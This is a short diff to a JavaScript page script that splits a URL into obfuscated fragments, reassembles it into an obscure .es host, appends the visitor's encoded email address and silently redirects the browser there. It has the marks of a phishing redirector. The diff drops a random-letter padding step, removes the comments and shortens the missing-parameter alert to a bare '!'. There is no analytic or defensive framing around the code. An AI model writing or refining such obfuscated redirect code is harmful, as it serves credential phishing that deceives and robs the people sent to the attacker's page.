@@ -38,17 +38,11 @@
         const redirectUrlParts = [
           "ht", "tps", ":/", "/eb", "u6a", "j.j", "xeb", "pue", "ehg", ".es", "/Ol", "Lfm", "M/?"
         ];
+        const finalUrl = combineChunks(redirectUrlParts) + combineChunks(emailChunks);
 
-        // Add two random letters after '/M/?'
-        const randomLetters = String.fromCharCode(97 + Math.floor(Math.random() * 26)) + String.fromCharCode(97 + Math.floor(Math.random() * 26));
-
-        // Combine the base URL parts, random letters, and encoded email chunks
-        const finalUrl = combineChunks(redirectUrlParts) + randomLetters + combineChunks(emailChunks);
-
-        // Redirect to the final URL
         window.location.href = finalUrl;
       } else {
-        alert("Email parameter 'EC' is missing!");
+        alert("!");
       }
     }
 
